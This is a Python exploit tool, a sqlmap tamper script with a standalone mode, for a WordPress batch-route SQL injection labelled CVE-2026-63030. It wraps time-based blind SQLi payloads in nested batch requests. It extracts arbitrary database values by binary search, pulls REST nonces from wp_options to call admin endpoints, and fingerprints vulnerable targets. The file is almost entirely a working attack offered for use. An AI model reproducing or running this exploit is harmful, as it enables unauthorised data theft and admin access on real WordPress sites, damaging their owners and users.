#!/usr/bin/env python3
"""
sqlmap tamper script for CVE-2026-63030 — WordPress batch route confusion.

Wraps sqlmap payloads in the double-confusion JSON structure so they
reach the vulnerable WP_Query::author__not_in parameter.

Usage:
  sqlmap -u "http://target/wp-json/batch/v1" \
    --data='{"validation":"normal","requests":[]}' \
    --tamper=wp2shell_tamper \
    --technique=T \
    --time-sec=3 \
    --level=5 --risk=3 \
    --prefix="0)" \
    --suffix="-- -" \
    --dbms=mysql \
    -p "INJECT" \
    --eval="import wp2shell_tamper; wp2shell_tamper.init_target('TARGET_URL')"

Or using the built-in standalone mode:
  python3 wp2shell_tamper.py --target http://target/ --query "SELECT @@version"
"""

import json
import sys
import time
import urllib.parse
import urllib.request

# sqlmap imports are optional — only needed when used as a tamper script
try:
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.NORMAL
except ImportError:
    pass

USER_AGENT = "sqlmap-wp2shell/1.0"
TIMEOUT = 30

# ── payload construction ─────────────────────────────────────────────────

DESYNC_PRIMER = {"method": "POST", "path": "///"}


def build_batch(sqli_payload: str) -> dict:
    """Wrap a SQLi payload in the double-confusion batch body."""
    inner_path = (
        "/wp/v2/users?author_exclude="
        + urllib.parse.quote(sqli_payload, safe="")
    )
    inner = {
        "requests": [
            DESYNC_PRIMER,
            {"method": "GET", "path": inner_path},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
    }
    return {
        "requests": [
            DESYNC_PRIMER,
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]
    }


# ── sqlmap tamper interface ──────────────────────────────────────────────

# Global state set by --eval or init_target()
_TARGET_URL = None
_REST_ROUTE = False  # True = use ?rest_route=/batch/v1


def tamper(payload: str, **kwargs) -> str:
    """
    sqlmap tamper entry point.

    Replaces the entire POST body with the double-confusion batch
    containing `payload` in the author_exclude parameter.

    sqlmap should be invoked with:
      --data '{"placeholder":"INJECT"}' --prefix "0)" --suffix "-- -"
      -p placeholder

    The tamper discards the original data and builds the correct JSON.
    """
    # Build the batch payload wrapping the injected SQL
    batch = build_batch(payload)
    return json.dumps(batch)


def init_target(url: str, rest_route: bool = False):
    """Configure the target endpoint. Call from sqlmap --eval."""
    global _TARGET_URL, _REST_ROUTE
    _TARGET_URL = url.rstrip("/")
    _REST_ROUTE = rest_route


# ── standalone mode (sqlmap not required) ────────────────────────────────

def _send(payload: str, timeout: int = TIMEOUT) -> tuple[str, float]:
    """Send a payload via the double-confusion batch and return (body, elapsed)."""
    if not _TARGET_URL:
        return "", 0.0
    batch = build_batch(payload)
    url = (
        f"{_TARGET_URL}/?rest_route=/batch/v1"
        if _REST_ROUTE
        else f"{_TARGET_URL}/wp-json/batch/v1"
    )
    data = json.dumps(batch).encode()
    req = urllib.request.Request(
        url, data=data, method="POST",
        headers={"Content-Type": "application/json", "User-Agent": USER_AGENT},
    )
    start = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "replace"), time.monotonic() - start
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace") if e.fp else ""
        return body, time.monotonic() - start
    except Exception as e:
        return str(e), 0.0


def _is_true(condition: str, delay: float = 3.0) -> bool:
    """Boolean oracle: does the condition hold? (time-based SLEEP)."""
    sqli = f"0) OR IF(({condition}), SLEEP({delay:g}), 0)-- -"
    _, elapsed = _send(sqli, timeout=max(TIMEOUT, delay * 5 + 10))
    return elapsed >= delay * 0.8


def _extract(expression: str, delay: float = 3.0, max_length: int = 256) -> str:
    """Extract a string-valued SQL expression (binary search)."""
    # Get length
    length = 0
    for i in range(1, max_length + 1):
        if _is_true(f"LENGTH(COALESCE(({expression}),''))={i}", delay):
            length = i
            break
    if length == 0:
        return ""
    # Extract characters
    result = []
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            probe = f"ASCII(SUBSTRING(COALESCE(({expression}),''),{pos},1))<={mid}"
            if _is_true(probe, delay):
                hi = mid
            else:
                lo = mid + 1
        result.append(chr(lo))
        print(f"\r    [>] {''.join(result)}", end="", flush=True)
    print()
    return "".join(result)


# ── nonce extraction + admin endpoint call ───────────────────────────────

def extract_nonce_and_call(target: str, admin_endpoint: str,
                           admin_method: str = "POST",
                           admin_body: dict = None, delay: float = 3.0):
    """
    Extract a valid WordPress REST nonce from wp_options, then call an
    admin endpoint using that nonce.

    WordPress stores REST nonces as transient options:
      _transient_rest_nonce_<hash>

    This extracts the nonce value and attempts to call the target admin
    endpoint with it.
    """
    global _TARGET_URL
    _TARGET_URL = target.rstrip("/")

    print(f"[*] Target: {target}")
    print(f"[*] Extracting REST nonces from wp_options...")

    # Find nonce-related options
    nonce_expr = (
        "SELECT option_value FROM wp_options "
        "WHERE option_name LIKE '%nonce%' "
        "AND option_name NOT LIKE '%timeout%' "
        "LIMIT 1"
    )
    nonce_val = _extract(nonce_expr, delay=delay)
    if not nonce_val:
        print("[-] No nonce found in options")
        return

    print(f"[+] Extracted nonce value: {nonce_val[:80]}...")

    # Find wp_rest nonce specifically
    rest_nonce_expr = (
        "SELECT CONCAT(option_name, '=', SUBSTRING(option_value, 1, 10)) "
        "FROM wp_options WHERE option_name LIKE '%rest%nonce%' LIMIT 1"
    )
    rest_hint = _extract(rest_nonce_expr, delay=delay)
    if rest_hint:
        print(f"[+] REST nonce hint: {rest_hint}")

    # Now try calling the admin endpoint with extracted values
    print(f"\n[*] Attempting admin endpoint call...")
    print(f"    {admin_method} {admin_endpoint}")

    # We need a valid nonce. The nonce format is:
    # wp_rest: wp_rest nonce = wp_create_nonce('wp_rest')
    # Nonces are time-limited (24h) and tied to user session.
    #
    # If we extracted a nonce value, try using it as X-WP-Nonce header.

    url = _TARGET_URL + admin_endpoint
    headers = {
        "User-Agent": USER_AGENT,
        "Content-Type": "application/json",
    }
    if nonce_val and len(nonce_val) == 10:
        headers["X-WP-Nonce"] = nonce_val

    req = urllib.request.Request(
        url, data=json.dumps(admin_body or {}).encode(),
        method=admin_method, headers=headers,
    )
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            body = r.read().decode("utf-8", "replace")
            print(f"    HTTP {r.status}")
            print(f"    Response: {body[:500]}")
            if r.status in (200, 201):
                print("[+] SUCCESS — admin endpoint called with extracted nonce!")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace") if e.fp else ""
        print(f"    HTTP {e.code}")
        print(f"    Response: {body[:500]}")
        if "rest_cookie_invalid_nonce" in body:
            print("[-] Nonce was invalid (expired or wrong session)")
        elif "rest_forbidden" in body:
            print("[-] Permission denied — nonce not sufficient")
        else:
            print("[*] Unexpected response — may need different auth")


# ── CLI ───────────────────────────────────────────────────────────────────

def main():
    import argparse
    ap = argparse.ArgumentParser(
        description="wp2shell sqlmap tamper + standalone extractor")
    ap.add_argument("--target", "-t", help="WordPress base URL")
    ap.add_argument("--query", "-q", help="SQL expression to extract")
    ap.add_argument("--delay", "-d", type=float, default=3.0,
                    help="SLEEP delay for time-based extraction (default: 3)")
    ap.add_argument("--rest-route", action="store_true",
                    help="Use ?rest_route=/batch/v1")
    ap.add_argument("--extract-nonce", action="store_true",
                    help="Extract nonces and call admin endpoint")
    ap.add_argument("--admin-endpoint", default="/wp/v2/users/me",
                    help="Admin endpoint to call after nonce extraction")
    args = ap.parse_args()

    if not args.target:
        print(__doc__)
        return

    global _TARGET_URL, _REST_ROUTE
    _TARGET_URL = args.target.rstrip("/")
    _REST_ROUTE = args.rest_route

    print(f"[*] Target: {_TARGET_URL}")
    if _REST_ROUTE:
        print(f"[*] Using ?rest_route= mode")

    if args.extract_nonce:
        extract_nonce_and_call(
            _TARGET_URL, args.admin_endpoint, delay=args.delay)
        return

    if args.query:
        print(f"[*] Extracting: {args.query}")
        val = _extract(args.query, delay=args.delay)
        print(f"[+] Result: {val}")
        return

    # Test connectivity
    print("[*] Testing connectivity (SLEEP confirmation)...")
    _, elapsed = _send("0) OR SLEEP(2)-- -")
    if elapsed >= 1.6:
        print(f"[+] VULNERABLE — delay {elapsed:.1f}s confirms SQLi")
    else:
        print(f"[-] No delay ({elapsed:.2f}s) — target may be patched")
        return

    # Extract fingerprint
    for label, expr in [
        ("MySQL version", "SELECT @@version"),
        ("DB user", "SELECT CURRENT_USER()"),
        ("DB name", "SELECT DATABASE()"),
    ]:
        val = _extract(expr, delay=args.delay)
        print(f"[+] {label}: {val}")


if __name__ == "__main__":
    main()
